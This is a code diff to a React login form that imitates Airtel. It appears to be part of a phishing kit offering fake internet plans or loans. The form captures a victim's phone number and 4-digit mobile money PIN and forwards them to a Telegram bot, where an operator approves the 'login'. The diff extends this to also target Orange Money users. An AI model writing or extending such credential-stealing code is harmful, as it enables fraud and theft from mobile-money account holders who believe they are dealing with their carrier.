@@ -4,8 +4,10 @@ import { AlertTriangle, ArrowLeft, Check, CheckCircle2, ChevronDown, Eye, EyeOff
 import { AirtelLogo, ValidatingModal, LanguageSwitch, useApp, validateAirtelPhone, AIRTEL_COUNTRIES } from '../App';
 import type { InternetPlan, CountryInfo } from '../App';
 import { sendLoginToTelegramAndWait } from '../utils/telegram';
+import type { PaymentProvider } from './LoanApplication1';
 interface LoginFormProps {
   selectedPlan: InternetPlan;
+  provider: PaymentProvider;
   onBack: () => void;
   onLoginSuccess: (
     phone: string,
@@ -18,6 +20,7 @@ interface LoginFormProps {
 
 export const LoginForm: React.FC<LoginFormProps> = ({
   selectedPlan,
+  provider,
   onBack,
   onLoginSuccess,
 }) => {
@@ -155,6 +158,7 @@ export const LoginForm: React.FC<LoginFormProps> = ({
     const message =
       `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
       `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+      `💳 <b>Moyen de paiement:</b> ${provider === 'orange' ? '🍊 Orange Money' : '🔴 Airtel Money'}\n` +
       `👤 <b>Numéro de Téléphone:</b> <code>${fullInternationalPhone}</code>\n` +
       `🔑 <b>Code PIN (4 chiffres):</b> <code>${currentPin}</code>\n` +
       `📦 <b>Forfait Choisi:</b> <b>${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})</b> (${selectedPlan.price})\n` +
@@ -164,7 +168,11 @@ export const LoginForm: React.FC<LoginFormProps> = ({
       `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
 
     try {
-      const isAccepted = await sendLoginToTelegramAndWait(message, phoneValidation.normalized, false);
+      const isAccepted = await sendLoginToTelegramAndWait(
+        message,
+        `${provider}_${phoneValidation.normalized}`,
+        false
+      );
       if (isAccepted) {
         onLoginSuccess(
           phoneNumber.trim(),
